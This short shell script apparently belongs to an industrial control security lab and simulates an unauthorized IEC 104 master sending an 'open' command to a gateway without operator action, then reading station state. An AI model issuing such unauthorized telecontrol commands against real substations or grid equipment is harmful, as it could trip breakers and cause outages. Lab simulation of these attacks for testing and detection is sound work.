#!/bin/sh
. /usr/local/bin/attack-env.sh
echo "== Unauthorized IEC 104 master OPEN to the gateway (no local operator action) =="
telecontrol104 master open
sleep 1.2
station-client read
